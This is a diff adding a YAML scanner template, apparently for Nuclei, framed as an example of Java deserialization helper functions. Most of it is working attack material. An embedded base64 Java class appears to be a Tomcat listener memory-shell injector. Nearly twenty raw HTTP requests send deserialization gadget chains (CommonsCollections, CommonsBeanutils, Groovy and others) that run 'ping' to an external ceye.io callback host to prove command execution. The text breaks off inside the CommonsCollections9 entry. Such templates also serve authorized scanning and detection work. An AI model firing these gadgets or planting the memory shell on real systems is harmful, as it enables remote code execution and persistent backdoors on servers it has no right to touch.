@@ -1,0 +1,433 @@
+id: deseriialization-helper-functions-examples
+
+info:
+  name: RAW Template example with all DSL deserialization helper functions
+  author: gongjl
+  severity: info
+variables:
+  base64Class: yv66vgAAADIBVQEALW9yZy9hcGFjaGUvY29tbW9ucy9sYW5nL2p0dlB3L0VuY3J5cHRpb25VdGlscwcAAQEAEGphdmEvbGFuZy9PYmplY3QHAAMBAAY8aW5pdD4BAAMoKVYBABNqYXZhL2xhbmcvRXhjZXB0aW9uBwAHDAAFAAYKAAQACQEACmdldENvbnRleHQBABIoKUxqYXZhL3V0aWwvTGlzdDsMAAsADAoAAgANAQAOamF2YS91dGlsL0xpc3QHAA8BAAhpdGVyYXRvcgEAFigpTGphdmEvdXRpbC9JdGVyYXRvcjsMABEAEgsAEAATAQASamF2YS91dGlsL0l0ZXJhdG9yBwAVAQAHaGFzTmV4dAEAAygpWgwAFwAYCwAWABkBAARuZXh0AQAUKClMamF2YS9sYW5nL09iamVjdDsMABsAHAsAFgAdAQAIZ2V0U2hlbGwBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwAHwAgCgACACEBAAZpbmplY3QBACcoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9PYmplY3Q7KVYMACMAJAoAAgAlAQAMZ2V0Q2xhc3NOYW1lAQAUKClMamF2YS9sYW5nL1N0cmluZzsBADFvcmcuYXBhY2hlLmh0dHAud2ViLmhhbmRsZXJzLmpyckZlLlJlcG9ydExpc3RlbmVyCAApAQAPZ2V0QmFzZTY0U3RyaW5nAQvcSDRzSUFBQUFBQUFBLzQxWENYZ2JSeFgrUjRkM0xTdVhjcXBKMDZiTjRVT09rcmlKcjZUVThwR1kya3FJM0FUYjVWaExZMHV4ckZWM1Y0a2R5bFVvVjduS0hlNEF4ZHdrQVdTN3BtbTRHaWpRRXE1eUZDaDN1QXFGY29XMjVzM3VTcEZzdWE0L2UzZG4zcHQ1LzN2dmYyL0c5ejkxOTFrQU8vQVV3M1pWR3dvcWFTVWE1OEc0WWFTRHgvaEFNSzZrWWttdTZjRWptdGJCZ3dkNVd0V01yb1J1OEJUWEpEQ0dsVWVVbzBvd3FhU0dncTFKUmRlN1ZDVW1SRTZHalVJMEd0UzVkalRKaldERWVoL2t0MlM0WHJDSm04RTV6TWNZZkYyWDk0b1lXaUkxMU15d2RQdk9XT1AyaHZxNmhqcEZhWWp1M0NHam5NR1ZKbE1NOG1IamVFOTRhRys3REMvdE1oTGJ5WEIxYTF1b2NWdGJXMXREdzY1ZGpmVWRqZHQzdGU1b0NPM3MyRmEvbzcydWJsdTlqQ1VNbmpnWE9NUEtDS2ZCVFlTeHRtV0lwd3daUG9ZS1MzaElTV1pJS2llakIvdTBlRStYakpVTVpic1RxWVJ4UFZtcnJEcmt4V3FzOGNBRlA4TVZsVjBsUTlGc3FhMFZhdXZJU2MzeXY1TjJTU2pKeEhFZVk5aHNyWjB2VnUxSENSbnR3N0Q4c29tZXVLWWVVd2FTWE1MVkRCc1dYQy9oR29abFE5d29sbEhBS3F1ZTFucXpGeHV4eVlOcnNabGhVN0dtU1pSOTlDaGVJcUhTaTJXUXkrRkFOVU01V2QxbmhqVHZhbEdXcStaT2VSRkFiUVdxc05XTEZkWkcyNGdNcy9VazdLQUVSZFdVb1NSU1JJaTFSVW1JSzFwRUFFcEZlWE5WbnhmWFlhY0hkZGpGc0dwSVlOWFRha3JuSFpvNmtnOUdFYno5QTBkNDFDaUNaMDk1MFlCR0Q0RnFvaVVMaGNReUkyRTNNYzJNdjY0bjFCVEROWE1DWDdEVzFDRTcxK05aSWd3M2VGRmhoU0hFNEtWZERpZ2FjZGZnbWhkdFZxVGFTVENnNkh6WGRXMDhxc2FJdWF0S3hiby81TVZlN0JQZ094bllLSU5VMlIvcU0rZHZSSmVZNy9aQ3NvenRaMWovOUJBbFBNY0MxR0tRZ1lHTXdSZk9jVDZJRWZSVTRDQnVLc29zRVp1NEl1RXd3NkpvUnRPSXU5WVV3NHJLd20yc1dkcW1GMzBlUEJmOTFJMElTQ3V4Z1k4YUJTWEk0QzlhV0ZpZFhqd1B6eGVyWHlBOHB3S3RpUEhCUklxYk9neXJLVGFkblhNVzA3SUJSTVVLUXVYVmk3emZVc0w3RXFTaXJqQ0lJZUYrbk1IUkg1SndwQ2dNbHA2RUpNT1Y1bXhDRFliR0RONmlhY3JZL295UnpoaTBPVmRHSktROFVFVUxXaklMcFlSYnlKOFVQOWFaMGcyRnFtQjJCUE9KMEdGNG9DRkQvWTBxUVVtUzV5dExWUUlWMFRHTWVqQUM2dGV5b1ZydXpkNDJYOE12d3ExQzk4VldDemlzSlF5UmpOVTVaZkxvQUduYUF0Si9LVjVXZ1QxNHVSZUxMZjY5Z2xicW1RSGROck9xc2pnWGVVTzM0MVdpc2wrZDY1REZPMHQ0TFlQN21QaWU1VmVPbkpTTU8vQjZEMTZITjFERUREVWZhRHBxS3MzU2VCUGVMS0o4Wjc3STJsTzVJdXNQbGNUMFZyeE5FT1R0d3VSOHFOOHBVTCtMVEE0bU0zbzhsQmtjRkFYOWJxd1JZWGdQWlRRdHZJZ1lTblM0UjFPaTNJdjNpUU5uQTk1ZmRCYTBqMFo1MmpDcjhZTlV6L1lSSStORFZFSVUrSTRFVDhiczA2eWhSRnFmWWJWK0JIY0poejVLbWRmc3BpYmpZelpwdDJhTVJISnJ5QXlOakU4UWlrSFZQbDQzTGRBT2NoWDFLWHhha1BBelZwdTA0cXZKT0dXeHA1c2JjWldxN1lZU3UvWFAyYTF3ZjQwUEpzbURvTFVER1RxRHp3bERuMmRZTTUrV2hDelZRaUoxVkIwbUR4cExCSzMvR1I0VWs1anlZQUozVTlSRWM3TGF5dks1L1loVXY0aDdSTG1jWlZqTVRlOTc3QUtUY1k2SXBtZFNXMGNTZW5ScnFDWFNuaU1nQmVqTG9tck5nWXl2V3NHelRnQ1MzVWV5R0xka1g1KzdSMTd2ZnVLMXBXZVJVTWEzNklyVDBoNlI4WUJOdGRGZ1ZCdExHMnF3TlpHT2k2TDZEdkdXYkYxdUxsWHpKbnJXV3ZMMXUvaWVCeGZ3ZllhcmloVDBOSS9TQlNTcWNlTkdQaGFoa1lRZldyRVRSYWw3OFNOUmlYWDRzZFdjU3hmemF2elVnNGZ3TUpXdnVLNEoxVTVMVStkMHBpU01zU0R0YnFyK0hMOFFRQjRoeHNiVWprUktvWVpiSm1wYVZQMnY4R3NoL0EyUjNDNnFOdnJUMURGeGExdC8yWFJZaldTaWNiUE9DbXJ4OTdUTVNrWlMwWGpNRkRQVUxsQU9PU0thNmhTcFArQ1BncTEvSWlmbVVaTHdGeXAwY1FwRm8rSlVwa3VoNkZ0OXdyMi80bThlUElySEtKc0V4WXQvaUh2TG8zamM2Z3lSVEpwclVVRS9MLzRsMktmaDN4NWNGSWZKSWpwSFJXSU51M0c0V3MxMnQ4aHNSdDFLdWtjeHpYankvdXJVbGh4MHlhWHd3WTF5Y1lXZzcwdjAvNFVESGhwWEZJd1gwWGh4d1hncGpaY1ZqSmZUZUVYQmVCV05tYmhzMC9OL05MT00zb3plN3VvSlhIRWE0a2VJMTlwaUh5MXgwTHVzdW1ZQ1YrYms2M0dWSldkN0NXSTV6VjJxeVdMTE9WUjFCODZnWmdwQkIrN0RJL252TTlpZVJmMEpQRkFkbUVEek9ld0pCNmJRd3REa0lwWFdLWFE0cUxpZjNlU3U5cnVkV1lTYjNIN1hHUnlZd2lHNkZwYjV5ODVqc3preERVZnZKRzdPNG9VVFVFalY3ejZiQlo5Q3dvbHhhTk5RZXllUWJwTDhaZWVnWlhHMFNmYkxmaW1MNDRmOWNzQjYrZDNXTzR1WEhLNmR3bTJNb0wzU3VYUnBGcS9KNG8zV1RMVlk4eFlYNFpqRU8vS3pwQ2ZVVGxnVDcyVmtVUTdYWnZHQjB4UUpHWS9oY1VvYXd4TVVpenE0Wm5BYkpBa09DZGRLcUpLd1I4SkJDY01TOVNUTUlBVm5YZ2JRZldXRGk0Sk05MkI2aXFBUG1ka0hObGQzMTRUQnh1SHNydkY5ZUJManZvL1RvM3NjRmVHYTNLY3pjSXJNZWlpdmZweTBBV3hCMlpOd21TWkdabWduaC9VSlJnK1Mwek1zNGFUa3dKT2tMR2gya25KSWg2eHQvbmJLcVpQZTNQZkpTWHpXZDlwNWp3am5GeGk5UjdLWTdxSlUzK3Y3a290bWU1Mis0UWlKYW1ndzB1dXNwdS9wYzZnNzFlWDdDcTJrRkhRSGhPN1hDblVEczNSTjlnbmZjK2pMd01ZSVhoRTR1bWJiNE82d3dRMWI0TTZYQlBjTjIyRGRYSEREOUV2NHZsbUk3OXVGNm9HNTZpYkVadXd1aEhock1VUW1idncyUkU1eWtiNUszNE9UK0VHNGR0MEpTSzV4dU56VGVLaVhhSnpGVDN3UFR1Qm5XZnl5bHVEKzlwUlpVMkxmR2pobXNNUk8zVENsNjRMSTJZVVpZYVpnamo0dXNDTGp2OHNWSlBVRG1BWExyRm90RjNjTkc5ZWQ5SGJUZSs5bFdsV1QrK0ZhMzhoZDJDaWcvTG5KNVhjUjgvL3VkNUhrbjBTdmRVMHVJdmwvd3VNekR3Zk9vMklhRjZuRy9udHZqbmNyaWNBQjZuSVcvRzJRVGQ3UlJick81cDM0TE9EZEUwS3MzU3poWW5uRkpSUVNFUDhITkJyL3hFSVJBQUE9CAAsAQAmKClMamF2YS91dGlsL0xpc3Q8TGphdmEvbGFuZy9PYmplY3Q7PjsBABNqYXZhL3V0aWwvQXJyYXlMaXN0BwAvCgAwAAkBABBqYXZhL2xhbmcvVGhyZWFkBwAyAQARZ2V0QWxsU3RhY2tUcmFjZXMBABEoKUxqYXZhL3V0aWwvTWFwOwwANAA1CgAzADYBAA1qYXZhL3V0aWwvTWFwBwA4AQAGa2V5U2V0AQARKClMamF2YS91dGlsL1NldDsMADoAOwsAOQA8AQANamF2YS91dGlsL1NldAcAPgsAPwATAQAHZ2V0TmFtZQwAQQAoCgAzAEIBABxDb250YWluZXJCYWNrZ3JvdW5kUHJvY2Vzc29yCABEAQAQamF2YS9sYW5nL1N0cmluZwcARgEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaDABIAEkKAEcASgEABnRhcmdldAgATAEADWdldEZpZWxkVmFsdWUBADgoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvT2JqZWN0OwwATgBPCgACAFABAAZ0aGlzJDAIAFIBAAhjaGlsZHJlbggAVAEABnZhbHVlcwEAGCgpTGphdmEvdXRpbC9Db2xsZWN0aW9uOwwAVgBXCwA5AFgBABRqYXZhL3V0aWwvQ29sbGVjdGlvbgcAWgsAWwATAQAGYWRkQWxsAQAZKExqYXZhL3V0aWwvQ29sbGVjdGlvbjspWgwAXQBeCwAQAF8BABVnZXRDb250ZXh0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7DABhAGIKADMAYwEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwwAZQBmCgAEAGcBAA9qYXZhL2xhbmcvQ2xhc3MHAGkBAAh0b1N0cmluZwwAawAoCgBqAGwBABlQYXJhbGxlbFdlYmFwcENsYXNzTG9hZGVyCABuAQAfVG9tY2F0RW1iZWRkZWRXZWJhcHBDbGFzc0xvYWRlcggAcAEACXJlc291cmNlcwgAcgEAB2NvbnRleHQIAHQBAANhZGQBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoMAHYAdwsAEAB4AQAUZ2V0V2ViQXBwQ2xhc3NMb2FkZXIBACsoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQAOZ2V0Q2xhc3NMb2FkZXIIAHwBAAxpbnZva2VNZXRob2QBAF0oTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9zYW5nL09iamVjdDsMAH4AfwoAAgCAAQAVamF2YS9zYW5nL0NsYXNzTG9hZGVyBwCCAQAJZ2V0TG9hZGVyCACEDAB6AHsKAAIAhgwAJwAoCgACAIgBAAlsb2FkQ2xhc3MBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7DACKAIsKAIMAjAEAC25ld0luc3RhbmNlDACOABwKAGoAjwwAKwAoCgACAJEBAAxkZWNvZGVCYXNlNjQBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCDACTAJQKAAIAlQEADmd6aXBEZWNvbXByZXNzAQAGKFtCKVtCDACXAJgKAAIAmQEAC2RlZmluZUNsYXNzCACbAQACW0IHAJ0BABFqYXZhL2xhbmcvSW50ZWdlcgcAnwEABFRZUEUBABFMamF2YS9zYW5nL0NsYXNzOwwAoQCiCQCgAKMBABFnZXREZWNsYXJlZE1ldGhvZAEAQChMamF2YS9zYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsMAKUApgoAagCnAQAYamF2YS9zYW5nL3JlZmxlY3QvTWV0aG9kBwCpAQANc2V0QWNjZXNzaWJsZQEABChaKVYMAKsArAoAqgCtAQAHdmFsdWVPZgEAFihJKUxqYXZhL2xhbmcvSW50ZWdlcjsMAK8AsAoAoACxAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9zYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7DACzALQKAKoAtQEAHGdldEFwcGxpY2F0aW9uRXZlbnRMaXN0ZW5lcnMIALcKAGoAQgEABmVxdWFscwwAugB3CgBHALsBABBqYXZhL2xhbmcvU3lzdGVtBwC9AQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07DAC/AMAJAL4AwQEAGWxpc3RlbmVyIGFscmVhZHkgaW5qZWN0ZWQIAMMBABpsaXN0ZW5lciBpbmplY3Qgc3VjY2Vzc2Z1bAgAxQEAE1tMamF2YS9zYW5nL09iamVjdDsHAMcBABBqYXZhL3V0aWwvQXJyYXlzBwDJAQAGYXNMaXN0AQAlKFtMamF2YS9zYW5nL09iamVjdDspTGphdmEvdXRpbC9MaXN0OwwAywDMCgDKAM0BABkoTGphdmEvdXRpbC9Db2xsZWN0aW9uOylWDAAFAM8KADAA0AEAHHNldEFwcGxpY2F0aW9uRXZlbnRMaXN0ZW5lcnMIANIBAAd0b0FycmF5AQAVKClbTGphdmEvbGFuZy9PYmplY3Q7DADUANULABAA1gEAEGphdmEudXRpbC5CYXNlNjQIANgBAAdmb3JOYW1lDADaAIsKAGoA2wEACmdldERlY29kZXIIAN0BAAlnZXRNZXRob2QMAN8ApgoAagDgAQAGZGVjb2RlCADiAQAWc3VuLm1pc2MuQkFTRTY0RGVjb2RlcggA5AEADGRlY29kZUJ1ZmZlcggA5gEAE2phdmEvaW8vSU9FeGNlcHRpb24HAOgBAB1qYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbQcA6goA6wAJAQAdamF2YS91dGlsL3ppcC9HWklQSW5wdXRTdHJlYW0HAO0BABxqYXZhL2lvL0J5dGVBcnJheUlucHV0U3RyZWFtBwDvAQAFKFtCKVYMAAUA8QoA8ADyAQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWDAAFAPQKAO4A9QEABHJlYWQBAAUoW0IpSQwA9wD4CgDuAPkBAAV3cml0ZQEAByhbQklJKVYMAPsA/AoA6wD9AQALdG9CeXRlQXJyYXkBAAQoKVtCDAD/AQAKAOsBAQEABWNsb3NlDAEDAAYKAO4BBAoA6wEEAQATamF2YS9zYW5nL1Rocm93YWJsZQcBBwEACGdldEZpZWxkAQA/KExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9zYW5nL3JlZmxlY3QvRmllbGQ7AQAeamF2YS9zYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uBwELAQAgamF2YS9zYW5nL0lsbGVnYWxBY2Nlc3NFeGNlcHRpb24HAQ0BABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9zYW5nL3JlZmxlY3QvRmllbGQ7DAEPARAKAGoBEQEADWdldFN1cGVyY2xhc3MMARMAZgoAagEUAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWDAAFARYKAQwBFwwBCQEKCgACARkBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAcBGwoBHACtAQADZ2V0DAEeACAKARwBHwEADXNldEZpZWxkVmFsdWUBADkoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9PYmplY3Q7KVYBAANzZXQMASMAJAoBHAEkAQBgKExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9zYW5nL0NsYXNzPCo+O1tMamF2YS9zYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAfamF2YS9zYW5nL05vU3VjaE1ldGhvZEV4Y2VwdGlvbgcBJwEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyBwEpCgEqAAkBABJNZXRob2Qgbm90IGZvdW5kOiAIASwBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsMAS4BLwoBKgEwCgEqAGwKASgBFwEAEWdldERlY2xhcmluZ0NsYXNzDAE0AGYKAKoBNQEAAUAIATcBAAhoYXNoQ29kZQEAAygpSQwBOQE6CgAEATsBABUoSSlMamF2YS9zYW5nL1N0cmluZzsMAK8BPQoARwE+AQAJc3Vic3RyaW5nAQAWKElJKUxqYXZhL2xhbmcvU3RyaW5nOwwBQAFBCgBHAUIBAAEuCAFEAQAIIGludm9rZWQIAUYBABJbTGphdmEvbGFuZy9DbGFzczsHAUgBABpqYXZhL2xhbmcvUnVudGltZUV4Y2VwdGlvbgcBSgEAF0Vycm9yIGludm9raW5nIG1ldGhvZDogCAFMAQAqKExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvVGhyb3dhYmxlOylWDAAFAU4KAUsBTwEABENv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
+
+http:
+  - raw:
+      # generate_java_gadget example
+      - |
+        POST /deserialize HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        gadget: BeanShell1
+
+        data={{generate_java_gadget_ext("BeanShell1", "Transform", "raw_cmd", "{\"cmd\":\"ping -c 1 nuclei.bs1.3p4u87.ceye.io\"}", "base64")}}
+      - |
+        POST /deserialize HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        gadget: CommonsCollectionsK3
+
+        data={{generate_java_gadget_ext("CommonsCollectionsK3", "Transform", "raw_cmd", "{\"cmd\":\"ping -c 1 nuclei.cck3.3p4u87.ceye.io\"}", "base64")}}
+      - |
+        POST /deserialize HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        gadget: CommonsCollectionsK4
+
+        data={{generate_java_gadget_ext("CommonsCollectionsK4", "Transform", "raw_cmd", "{\"cmd\":\"ping -c 1 nuclei.cck4.3p4u87.ceye.io\"}", "base64")}}
+      - |
+        POST /deserialize HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        gadget: Groovy1
+
+        data={{generate_java_gadget_ext("Groovy1", "Transform", "raw_cmd", "{\"cmd\":\"ping -c 1 nuclei.gv1.3p4u87.ceye.io\"}", "base64")}}
+      - |
+        POST /deserialize HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        gadget: Click1
+
+        data={{generate_java_gadget_ext("Click1", "TemplateImpl", "RuntimeExec", "{\"cmd\":\"ping -c 1 nuclei.ck1.3p4u87.ceye.io\"}", "base64")}}
+      - |
+        POST /deserialize HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        gadget: CommonsBeanutils1
+
+        data={{generate_java_gadget_ext("CommonsBeanutils1", "TemplateImpl", "RuntimeExec", "{\"cmd\":\"ping -c 1 nuclei.cbu1.3p4u87.ceye.io\"}", "base64")}}
+      - |
+        POST /deserialize HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        gadget: CommonsBeanutils1_183
+
+        data={{generate_java_gadget_ext("CommonsBeanutils1_183", "TemplateImpl", "RuntimeExec", "{\"cmd\":\"ping -c 1 nuclei.cbu1183.3p4u87.ceye.io\"}", "base64")}}
+      - |
+        POST /deserialize HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        gadget: CommonsBeanutils2_183
+
+        data={{generate_java_gadget_ext("CommonsBeanutils2_183", "TemplateImpl", "RuntimeExec", "{\"cmd\":\"ping -c 1 nuclei.cbu2183.3p4u87.ceye.io\"}", "base64")}}
+      - |
+        POST /deserialize HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        gadget: CommonsBeanutils2
+
+        data={{generate_java_gadget_ext("CommonsBeanutils2", "TemplateImpl", "RuntimeExec", "{\"cmd\":\"ping -c 1 nuclei.cbu2.3p4u87.ceye.io\"}", "base64")}}
+      - |
+        POST /deserialize HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        gadget: CommonsCollections1
+
+        data={{generate_java_gadget_ext("CommonsCollections1", "Transform", "raw_cmd", "{\"cmd\":\"ping -c 1 nuclei.cc1.3p4u87.ceye.io\"}", "base64")}}
+      - |
+        POST /deserialize HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        gadget: CommonsCollections2
+
+        data={{generate_java_gadget_ext("CommonsCollections2", "TemplateImpl", "RuntimeExec", "{\"cmd\":\"ping -c 1 nuclei.cc2.3p4u87.ceye.io\"}", "base64")}}
+      - |
+        POST /deserialize HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        gadget: CommonsCollections3
+
+        data={{generate_java_gadget_ext("CommonsCollections3", "TemplateImpl", "RuntimeExec", "{\"cmd\":\"ping -c 1 nuclei.cc3.3p4u87.ceye.io\"}", "base64")}}
+      - |
+        POST /deserialize HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        gadget: CommonsCollections4
+
+        data={{generate_java_gadget_ext("CommonsCollections4", "TemplateImpl", "RuntimeExec", "{\"cmd\":\"ping -c 1 nuclei.cc4.3p4u87.ceye.io\"}", "base64")}}
+      - |
+        POST /deserialize HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        gadget: CommonsCollections5
+
+        data={{generate_java_gadget_ext("CommonsCollections5", "Transform", "raw_cmd", "{\"cmd\":\"ping -c 1 nuclei.cc5.3p4u87.ceye.io\"}", "base64")}}
+      - |
+        POST /deserialize HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        gadget: CommonsCollections6
+
+        data={{generate_java_gadget_ext("CommonsCollections6", "Transform", "raw_cmd", "{\"cmd\":\"ping -c 1 nuclei.cc6.3p4u87.ceye.io\"}", "base64")}}
+      - |
+        POST /deserialize HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        gadget: CommonsCollections6Lite
+
+        data={{generate_java_gadget_ext("CommonsCollections6Lite", "Transform", "raw_cmd", "{\"cmd\":\"ping -c 1 nuclei.cc6l.3p4u87.ceye.io\"}", "base64")}}
+      - |
+        POST /deserialize HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        gadget: CommonsCollections7
+
+        data={{generate_java_gadget_ext("CommonsCollections7", "Transform", "raw_cmd", "{\"cmd\":\"ping -c 1 nuclei.cc7.3p4u87.ceye.io\"}", "base64")}}
+      - |
+        POST /deserialize HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        gadget: CommonsCollections8
+
+        data={{generate_java_gadget_ext("CommonsCollections8", "TemplateImpl", "RuntimeExec", "{\"cmd\":\"ping -c 1 nuclei.cc8.3p4u87.ceye.io\"}", "base64")}}
+      - |
+        POST /deserialize HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        gadget: CommonsCollections9
+
